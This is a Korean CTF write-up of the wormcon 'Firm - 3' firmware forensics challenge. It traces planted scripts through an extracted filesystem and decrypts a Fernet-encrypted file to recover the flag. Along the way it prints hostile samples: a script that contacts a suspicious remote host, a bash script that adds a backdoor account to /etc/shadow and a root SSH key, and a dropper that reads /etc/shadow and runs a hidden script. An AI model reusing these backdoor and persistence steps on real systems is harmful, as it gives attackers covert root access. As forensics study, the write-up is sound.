# Firm - 3
```
Download

Author : x3rz & l3v1ath4n
```
디스크립션이 매우 심플하다. 바이너리 파일을 다운받을 수 있는데 내부를 살펴보면 다음과 같다.

![image](https://user-images.githubusercontent.com/44149738/131450074-ada57467-7581-4f7d-b413-813fdf62302c.png)

파일 시스템이 들어있을 것을 확인할 수 있고 바로 extract 했다. 찾아보면 이런 파일도 있다.

![image](https://user-images.githubusercontent.com/44149738/131450485-850581a8-a863-4b1a-80d8-b37aafafed09.png)

```
str1ng5_ar3_0P
```

매우 flag 같이 생겼지만 아니다. 단순히 페이크인지 무슨 의미가 담겨 있는건지는 모르겠다.

## /etc/mklashgs.py
상수형이 찾은 의심스러운 파일이 하나 있었는데 다음과 같다.
```python
import requests,os
from bs4 import BeautifulSoup
import binascii
xvcghe = []

cvnfhf = "https://fbNZrilP.vulnfreak.org/EQbShTxG.pds"
mfghoys = requests.get(cvnfhf)
ssdvfsdfwrw = BeautifulSoup(mfghoys.content, 'html.parser')
mdhsxe = ssdvfsdfwrw.find('table')
bnlasde = open("/bin/kill1", "w")
wefbxz = mdhsxe.find('tbody')

bnjsh = '108.255.22.123:1337'
if (requests.get(bnjsh)):
	os.sytem("bash ping h4cyl2dcg.vulnfreak.org")
	os.sytem('touch /root/.ljsyc')
else:
	pass
ksauhna = wefbxz.find_all('tr')
for cpiunbs in ksauhna:
      xzng = cpiunbs.find_all('td')
      for zxvds in xzng:
      	xvcghe.append(zxvds.text)

def ljnuyas(loyxo):
	bhksd = ''.join(loyxo).encode()
	return bhksd
kllsoer = ljnuyas(xvcghe)
bnlasde.write(f'{kllsoer}')
bnlasde.close()

# for asdasd in xvcghe:
# 	asdasd ^ 118(base)
```
우선 코드에 적혀있는 사이트들은 다 접속이 안된다. 변수명을 기이하게 적어놓아서 난독화 규칙을 찾아서 URL을 복구하는 문제인가 싶었지만 상수형이 그냥 분석 속도 늦추기 위함이라고 하셔서 폭풍삽질 5시간은 단축했다. 상수형 직감 클라스 ㄷㄷ,,,

## /bin/kill1
`/etc/mklashgs.py` 코드에서 파일 입출력을 하는 부분이 있는데 그게 바로 `/bin/kill1` 이 부분이다 주석을 보면 118과 XOR 연산하는 것을 확인할 수 있는데 다시 XOR 연산을 진행해서 118을 상쇄시키면 다음과 같은 메세지가 나온다.
```
welcometowormconbash /var/lib/misc/2tz.s
```
`wormcon bash`로 실행시킨다는 재미있는 컨셉이다. 아무튼 `/var/lib/misc/2tz.s` 파일이 존재함을 알 수 있다.

## /var/lib/misc/2tz.s
```bash
echo "Re4ch3D 4n0tH3r L3v3L"

echo "ksldkln:$6$GsG9ub.tWUTPxonE$3vog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::" >> /etc/shadow

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDx6t7h8TL8Ol+v6ERO1ywV5aD5XHElJ1KQdcWy5nz6t7PzAGjcuyp6zAZT2cEgzCLJZxT7fCmcrwUOgWjTlQYMH63DqodMBQp3ipfyM0POLrEv68epAIUyBfOFC/5upWiYu0uePc7S5uAgiWopW8ZCbogI81st5UG18EUeNNouFWrB52fuhO5nmRd96Bm3BV5naQm6CKfInqm1JK102cxH1Yv/Ni4Hu9WOcm+Om3OzLgT4q3a8Gtm8hP0xfs+xnYisUyXcl7WVvgOXKht5hGPoknvL+X3tKd6CX9SCMisjSQN9keuKWGJNVVBt+LJI63/y8lzR6V0AyKV6tOfFBWFakwJcaU4c1w5I8j7nr+BT0Wv7pr2Sryo49o5i8rKo6Ny8gFvRE+JZ7674xHQs/dL7yYZkT8r+fgWiMwYFqUaETiISAsZUqFFWA2Smn3Q4JNWIrU9HptSuPaZ17JXv9TkHAZx3Xa+vtrjvkhCUc4A6ExBChEbf4p0u5OPaf5phrFU= root@root" > /root/.authorized_keys












# To add File for dropper at /usr/bin/pgrep1
```
bash로 실행시켰으니 당연히 파일도 bash 파일이다. 플래그 같이 생긴 출력문도 존재하고 ssh key도 존재하는것 같다. 삽질을 유도하는 무서운 출력문들이다. 여기서는 가장 아래 주석을 잘 보아야 한다. `/usr/bin/pgrep1` 파일이 존재함을 알 수 있다. 코드와 주석 사이에 개행을 왜이리 많이 넣어두었나 했었는데, 이제와 생각해보니 이 주석을 강조하기 위함이 아니었을까 싶다. 

## /usr/bin/pgrep1
```python
from cryptography.fernet import Fernet
import requests
from bs4 import BeautifulSoup
nsalkd = ''

with open('/etc/shadow', 'r') as f:
    lnsdg = f.read().splitlines()
    lmnasdi = lnsdg[-1]
    nsalkd = lmnasdi


def hkmlsad(baskas):
    return baskas.split('.')

def sdjsl(sjcsl):
    return sjcsl[1].split(":")    

def hslkcm(jslscs):
    return jslscs[1].split('+')

jkadskj = hkmlsad(nsalkd)
nuiusd = hslkcm(jkadskj)
nscdl = sdjsl(nuiusd)[0].encode()

xvcghe = ''

cvnfhf = "https://cdfdfxrgt.vulnfreak.org/jadsclkx"
mfghoys = requests.get(cvnfhf)
cdcsdcsd = BeautifulSoup(mfghoys.content, 'html.parser')
nsalkd = cdcsdcsd.encode()

pkmsdhy=Fernet(nscdl)
nmasdpod= pkmsdhy.encrypt(nsalkd)

bnlasde = open("/root/ndfsdj", "w")
bnlasde.write(f'{nmasdpod}')
bnlasde.close()

os.system('bash /bin/.ps')
```
여기서도 파일입출력이 발생하는데 `/root/ndfsdj`이 파일이 그것이다. 실제로 열어보면 다음과 같다.
```
gAAAAABhIPksf_ALraPBo3d5_qTca5SEzOv2oB9LuXT78SWTNfMujG4sHG-5mO307ISlMgcHQ53iFNg4-mon0izS3wMd4dnWS3IoH7RFq01LmWALboyh2IeoSoZ99ySrP9Igi32gWb1_8KHfnhbpgOG9X8CU1VFggg==
```
처음에는 `padding` 때문에 `base64`나 비슷한 계열의 encoding 알고리즘을 적용한 것이라고 생각했지만 정상적으로 decoding 되지 않았다.

코드를 통해 이 파일에 어떠한 값을 write 하는지 살펴보았다.
```python
pkmsdhy=Fernet(nscdl)
nmasdpod= pkmsdhy.encrypt(nsalkd)

bnlasde = open("/root/ndfsdj", "w")
bnlasde.write(f'{nmasdpod}')
```
핵심은 위와 같다. `Fernet` 암호체계를 이용하여 암호화를 진행한 결과를 write 한 것이었으며, 이는 `nsalkd` 변수 값을 `nscdl` 변수를 키로 사용하여 암호화 한 것이다.

먼저 평문인 `nsalkd` 변수는 web request를 통해 받아온 값으로 현재 접근할 수 없다. 반면 key로 사용한 `nscdl` 변수는 다음과 같은 로직으로 생성된다.
```python
with open('/etc/shadow', 'r') as f:
    lnsdg = f.read().splitlines()
    lmnasdi = lnsdg[-1]
    nsalkd = lmnasdi


def hkmlsad(baskas):
    return baskas.split('.')

def sdjsl(sjcsl):
    return sjcsl[1].split(":")    

def hslkcm(jslscs):
    return jslscs[1].split('+')

jkadskj = hkmlsad(nsalkd)
nuiusd = hslkcm(jkadskj)
nscdl = sdjsl(nuiusd)[0].encode()
```
결론부터 말하면 `/etc/shadow`를 이리저리 지지고 볶아서 key를 만든다. `/etc/shadow`는 다음과 같은 상태다.
```
root:$6$salt$2g13aibLWF.TAr10kwmtd4gaCyJ2O6y2xppR.wMlinlPShfZcYtVF4sKPE0jUIlJUt8n6WacTyMBkCPYezUSs1:17994:17994:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
dnsmasq:x:0:0:99999:7:::
```
여기서 들 수 있는 의문점은 처음 shadow 파일을 읽어서 `[-1]` 데이터를 기반으로 생성되는 것인데, 현재 shadow 데이터와 맞지 않는다. 즉, 새로 추가된 계정이라는 얘기인데, 문득 앞에서 보았던 `/var/lib/misc/2tz.s` 파일이 생각났다.
```bash
echo "ksldkln:$6$GsG9ub.tWUTPxonE$3vog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::" >> /etc/shadow
```
여러 특수문자가 존재하는 것을 보고 확신했다. 이를 통해서 key를 구했다.
```python
>>> def hkmlsad(baskas):
...     return baskas.split('.')
... 
>>> def sdjsl(sjcsl):
...     return sjcsl[1].split(":")    
... 
>>> def hslkcm(jslscs):
...     return jslscs[1].split('+')
... 
>>> 
>>> nsalkd = "ksldkln:$6$GsG9ub.tWUTPxonE$3vog70Pde1/VGczwALgpPUbsmeaVAzIdsjPfEqWzlfty72yl6HIsZt6bCWCHm/89+YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4=:18668:0:99999:7:::"
>>> 
>>> jkadskj = hkmlsad(nsalkd)
>>> nuiusd = hslkcm(jkadskj)
>>> nscdl = sdjsl(nuiusd)[0].encode()
>>> 
>>> nscdl
b'YjSYLCqFLAcTgtUO16NAJxKDOGOJHFjV-EOtp15_SD4='
```
흐름이 자연스러워서 직감적으로 Fernet이 대칭키 알고리즘이라고 생각했고, 바로 구글신에게 `online fernet decrypt`라고 질의했다.

## Fernet decrypt
딱 좋은 사이트를 발견했다.

https://asecuritysite.com/encryption/ferdecode

`/root/ndfsdj` 파일의 내용과 방금 구한 key 값을 넣고 실행해보았다

![image](https://user-images.githubusercontent.com/44149738/131455693-b21e1fab-7138-48bf-a982-43e58ee33685.png)

## flag
```
wormcon{F1nd1nG_M3_1s_N0T_345Y!!!!!!!!!!!!!!!!!!!}
```